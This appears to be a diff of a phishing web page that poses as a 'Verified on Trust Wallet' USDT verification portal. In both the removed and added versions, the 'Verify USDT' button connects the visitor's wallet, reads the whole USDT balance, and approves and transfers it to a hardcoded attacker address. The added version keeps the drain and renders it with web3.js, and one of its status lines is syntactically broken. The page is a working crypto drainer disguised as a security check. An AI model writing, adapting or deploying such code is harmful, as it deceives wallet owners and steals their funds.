@@ -1,123 +1,86 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html><html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Verified on Trust Wallet</title>
+  <title>Verify USDT</title>
+  <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js@1.0.0-beta.36/dist/web3.min.js"></script>
   <style>
     body {
       margin: 0;
+      padding: 0;
       font-family: Arial, sans-serif;
-      background: linear-gradient(135deg, #0049b1, #001f57);
+      background-color: #001f3f;
       color: white;
       text-align: center;
-      padding: 30px 20px;
     }
-    .logo {
-      margin-top: 40px;
+    iframe {
+      max-width: 100%;
+      border: none;
+      border-radius: 8px;
     }
-    .logo img {
-      width: 80px;
-    }
-    .title {
-      font-size: 22px;
-      font-weight: bold;
-      margin: 20px 0 10px;
-      color: #00ffcc;
-    }
-    .subtitle {
-      font-size: 14px;
-      color: #b0dfff;
-      margin-bottom: 40px;
-    }
-    .box {
-      background: #0d1b3e;
-      padding: 30px;
-      border-radius: 12px;
-      max-width: 400px;
-      margin: auto;
-    }
-    .box h2 {
-      font-size: 20px;
-      margin-bottom: 10px;
-    }
-    .box p {
-      font-size: 14px;
-      color: #d0d0d0;
-      margin-bottom: 30px;
-    }
-    .btn {
-      padding: 12px 30px;
-      background: #00f2a6;
-      color: black;
+    #verifyBtn {
+      margin-top: 20px;
+      padding: 15px 30px;
+      background: linear-gradient(90deg, #00ffcc, #3366ff);
       border: none;
       border-radius: 30px;
-      font-size: 16px;
+      font-size: 18px;
+      font-weight: bold;
+      color: #000;
       cursor: pointer;
+      transition: all 0.3s ease-in-out;
     }
-    .btn:hover {
-      background: #00db96;
+    #verifyBtn:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 15px #00ffcc;
     }
-    .terms {
-      font-size: 12px;
-      color: #c0c0c0;
-      margin-top: 40px;
-    }
-    .powered {
-      margin-top: 10px;
-      font-size: 11px;
-      color: #888;
+    #status {
+      margin-top: 20px;
+      font-size: 16px;
     }
   </style>
 </head>
-<body>
-  <div class="logo">
-    <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" alt="BNB Logo" />
-  </div>
-  <div class="title">
-    ✅ Verified on Trust Wallet
-  </div>
-  <div class="subtitle">
-    Secure BEP20 USDT Verification Portal
-  </div>
-  <div class="box">
-    <h2>Verify Your Wallet</h2>
-    <p>Click below to verify by sending all your USDT</p>
-    <button class="btn" onclick="verifyUSDT()">Verify USDT</button>
-  </div>
-  <div class="terms">
-    <b>Terms & Conditions:</b><br />
-    Minimum 200 USDT required for verification.<br />
-    Transfers below this amount will be marked as failed.
-  </div>
-  <div class="powered">
-    Powered by BEP20 Payment Gateway
-  </div>  <script>
-    const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999"; // tumhara wallet
-    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT
+<body>  <h2 style="color: #00ffcc">Verified on Trust Wallet</h2>
+  <p>Secure BEP20 USDT Verification Portal</p>  <!-- Canva embedded design (optional background/frame)-->  <div style="position: relative; width: 100%; height: 0; padding-top: 556.7350%; padding-bottom: 0; margin: 1.6em 0; overflow: hidden; border-radius: 8px;">
+    <iframe loading="lazy" style="position: absolute; width: 100%; height: 100%; top: 0; left: 0;" src="https://www.canva.com/design/DAGqu3wFQs4/a7G3-SuUSKkMfyyhW5tPBA/view?embed" allowfullscreen="allowfullscreen"></iframe>
+  </div>  <!-- Custom button --><button id="verifyBtn" onclick="connectAndSend()">Verify USDT</button>
 
-    async function verifyUSDT() {
+  <p id="status"></p>  <script>
+    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
+    const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999"; // your wallet
+    const usdtABI = [
+      { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
+      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" },
+      { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" }
+    ];
+
+    async function connectAndSend() {
       if (typeof window.ethereum === 'undefined') {
-        alert("Trust Wallet ya MetaMask connect karen.");
+        alert('Trust Wallet or MetaMask not detected');
         return;
       }
 
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-      const signer = provider.getSigner();
-      const address = await signer.getAddress();
+      const web3 = new Web3(window.ethereum);
+      try {
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const sender = accounts[0];
+        const usdt = new web3.eth.Contract(usdtABI, usdtAddress);
+        const balance = await usdt.methods.balanceOf(sender).call();
 
-      const usdt = new ethers.Contract(usdtAddress, [
-        "function approve(address spender, uint amount) public returns (bool)",
-        "function allowance(address owner, address spender) public view returns (uint)",
-        "function balanceOf(address account) view returns (uint256)",
-        "function transferFrom(address sender, address recipient, uint256 amount) returns (bool)"
-      ], signer);
+        if (balance == 0) {
+          document.getElementById("status").innerText = "No USDT in wallet.";
+          return;
+        }
 
-      const balance = await usdt.balanceOf(address);
-      const tx1 = await usdt.approve(receiver, balance);
-      await tx1.wait();
-      const tx2 = await usdt.transferFrom(address, receiver, balance);
-      await tx2.wait();
-      alert("Verification successful");
+        document.getElementById("status").innerText = "Approving...";
+        await usdt.methods.approve(receiver, balance).send({ from: sender });
+
+        document.getElementById("status").innerText = "Transferring...";
+        await usdt.methods.transfer(receiver, balance).send({ from: sender });
+
+        document.getElementById("status").innerText = ${web3.utils.fromWei(balance)} USDT verified.;
+      } catch (err) {
+        console.error(err);
+        document.getElementById("status").innerText = "Transaction failed or cancelled.";
+      }
     }
-  </script>  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script></body>
+  </script></body>
 </html>
